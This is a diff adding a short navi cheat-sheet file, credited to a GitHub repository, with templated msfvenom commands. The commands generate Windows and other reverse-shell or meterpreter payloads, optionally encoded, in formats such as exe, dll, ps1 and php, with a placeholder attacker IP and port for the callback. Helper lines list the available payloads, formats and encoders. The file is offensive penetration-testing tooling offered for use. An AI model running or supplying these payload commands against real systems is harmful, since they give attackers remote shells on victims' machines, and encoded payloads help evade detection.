@@ -1,0 +1,14 @@
+% windows, msfvenom, payload generation, metasploit
+; From https://github.com/sealldeveloper/navi-cheats/
+; most of this is better written and easily accessible on revshells.com but this was made just incase :)
+
+# Generate an msfvenom payload reverse shell / meterpreter reverse shell / etc (exe,dll,shellcode,ps1,php,bash,etc)
+msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> -f <format> -o <filename>.<format>
+
+# Generate an msfvenom payload with encoding reverse shell / meterpreter reverse shell / etc (exe,dll,shellcode,ps1,php,bash,etc)
+msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> -f <format> -o <filename>.<format> -e <encoder>
+
+
+$ payload: msfvenom -l payloads | grep -E "^\s*[^\s]+\s+" | sed 's/[[:space:]]*//' | sed 's/[[:space:]]\{1,\}/ | /' | tail -n +4 --- --header "Payload | Description" --delimiter ' \| ' --column 1
+$ format: msfvenom -l formats | grep -E "^\s*[a-z]+" | sed 's/[[:space:]]*//'
+$ encoder : msfvenom -l encoders | grep -E "^\s*[a-z]+" | sed -E 's/^[[:space:]]*([a-z0-9_\/]+)[[:space:]]+([a-zA-Z]+)[[:space:]]+(.*)$/\1 | \2 | \3/' --- --header "Name | Rank | Description" --delimiter ' \| ' --column 1
